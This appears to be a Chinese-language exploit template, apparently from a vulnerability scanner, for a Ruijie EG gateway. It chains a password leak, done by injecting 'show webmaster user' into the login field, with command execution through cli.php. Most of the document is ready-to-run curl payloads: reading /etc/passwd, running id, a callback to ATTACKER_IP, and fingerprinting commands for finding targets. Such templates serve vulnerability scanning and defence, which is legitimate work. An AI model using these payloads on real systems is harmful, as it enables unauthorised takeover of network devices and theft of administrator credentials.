---
id: RUIJIE-EG-RCE
title: 锐捷 EG 易网关 cli.php 远程命令执行漏洞
product: ruijie
vendor: Ruijie (锐捷)
version_affected: "锐捷 EG 易网关（受影响版本）"
severity: CRITICAL
tags: [rce, command_injection, 无需认证, 国产]
fingerprint: ["Ruijie", "锐捷", "EG易网关", "RUIJIEID"]
---

## 漏洞描述

锐捷 EG 易网关 `login.php` 接口存在密码泄露漏洞，攻击者可通过在密码字段注入 `show webmaster user` 命令获取管理员明文密码。获取密码后登录系统，利用 `cli.php?a=shell` 接口直接执行系统命令，实现未授权远程命令执行。

## 影响版本

- 锐捷 EG 易网关（受影响版本）

## 前置条件

- 无需认证（通过密码泄露获取凭据）
- 目标 HTTP 端口可访问
- `/login.php` 和 `/cli.php` 接口可达

## 利用步骤

1. 确认目标为锐捷 EG 易网关
2. 向 `/login.php` 发送特殊构造的登录请求，在密码字段注入 `admin?show+webmaster+user` 获取管理员明文密码
3. 使用获取的管理员密码正常登录，获取 `RUIJIEID` 会话 Cookie
4. 携带会话 Cookie 向 `/cli.php?a=shell` 发送命令执行请求
5. 从响应中获取命令执行结果

## Payload

### 第一步：获取管理员密码

```bash
curl -X POST "http://target/login.php" -d "username=admin&password=admin?show+webmaster+user"
```

### 第二步：使用获取的密码登录（将 PASSWORD 替换为获取的密码）

```bash
curl -X POST "http://target/login.php" -d "username=admin&password=PASSWORD" -c cookies.txt
```

### 第三步：执行系统命令

```bash
curl -X POST "http://target/cli.php?a=shell" -b cookies.txt -d "notdelay=true&command=cat /etc/passwd"
```

### 执行 id 命令

```bash
curl -X POST "http://target/cli.php?a=shell" -b cookies.txt -d "notdelay=true&command=id"
```

### HTTP 回调验证

```bash
curl -X POST "http://target/cli.php?a=shell" -b cookies.txt -d "notdelay=true&command=curl http://ATTACKER_IP/callback"
```

## 验证方法

```bash
# 检查第一步密码泄露响应中是否包含密码信息
curl -s -X POST "http://target/login.php" -d "username=admin&password=admin?show+webmaster+user" | grep -i "password\|密码"

# 检查命令执行响应中是否包含 /etc/passwd 内容
curl -s -X POST "http://target/cli.php?a=shell" -b cookies.txt -d "notdelay=true&command=cat /etc/passwd" | grep "root:"

# 检查 id 命令输出
curl -s -X POST "http://target/cli.php?a=shell" -b cookies.txt -d "notdelay=true&command=id" | grep "uid="
```

## 指纹确认

```bash
curl -s "http://target/" | grep -i "Ruijie\|锐捷\|EG易网关\|EWEB"
curl -s -o /dev/null -w "%{http_code}" "http://target/login.php"
```
